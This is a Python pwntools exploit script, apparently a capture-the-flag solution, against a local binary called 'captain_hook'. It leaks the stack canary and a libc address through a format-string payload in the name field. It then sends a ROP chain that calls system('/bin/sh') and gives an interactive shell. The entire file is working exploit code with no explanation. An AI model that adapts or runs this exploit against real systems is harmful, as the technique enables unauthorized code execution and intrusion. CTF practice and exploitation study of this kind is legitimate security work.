from pwn import *


libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

PROMPT = 'peterpan@pwnuser:~$ '

def lock(conn, name = 'AAAA', index = 0, age = 1, date = '12/12/2020'):
    conn.sendlineafter(PROMPT, '2')
    conn.sendlineafter(' [ Character index ]: ', str(index))
    conn.sendlineafter('  Name: ', name)
    conn.sendlineafter('  Age: ', str(age))
    conn.sendlineafter('  Date (mm/dd/yyyy): ', date)

def read(conn, index = 0):
    response = {
        'name': '',
        'age': 0,
        'date': '',
    }
    conn.sendlineafter(PROMPT, '3')
    conn.sendlineafter(' [ Character index ]: ', str(index))

    conn.recvuntil('Character name: ')
    response['name'] = conn.recvline().strip()

    conn.recvuntil('Age: ')
    response['age'] = int(conn.recvline())

    conn.recvuntil('He\'s been locked up on ')
    response['date'] = conn.recvline().strip()[:-1]  # Drop training fullstop

    return response

def edit(conn, name = 'AAAA', index = 0, age = 1, date = '12/12/2020'):
    conn.sendlineafter(PROMPT, '4')
    conn.sendlineafter(' [ Character index ]: ', str(index))
    conn.sendlineafter('  Name: ', name)
    conn.sendlineafter('  Age: ', str(age))
    conn.sendlineafter('  Date (mm/dd/yyyy): ', date)






conn = process("./captain_hook")

lock(conn)
edit(conn, name=b"A"*10 + b"-%17$p-%19$p")
datas = read(conn)

useful = datas['date'].split(b"-")
canary = int(useful[1],16)
leak = int(useful[2], 16)
log.info(useful)
libc.address = leak - (libc.symbols['__libc_start_main'] + 243)

system = libc.symbols['system']
log.info("canary:    "+hex(canary))
log.info("libc  :    "+hex(libc.address))
log.info("system:    "+hex(system))
pause()

log.success('Built ROP Chain (Call one_gadget)')
CANARY_OFFSET = 40
PAYLOAD_PADDING = CANARY_OFFSET + 8 + 8
# Stage 3: Pwn

payload = b"A"*40
payload += p64(canary)
payload += b"A"*8
payload += p64(libc.address + 0x00000000000c1479)
payload += p64(libc.address + 0x0000000000026b72)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(system)
edit(conn, payload)

conn.interactive()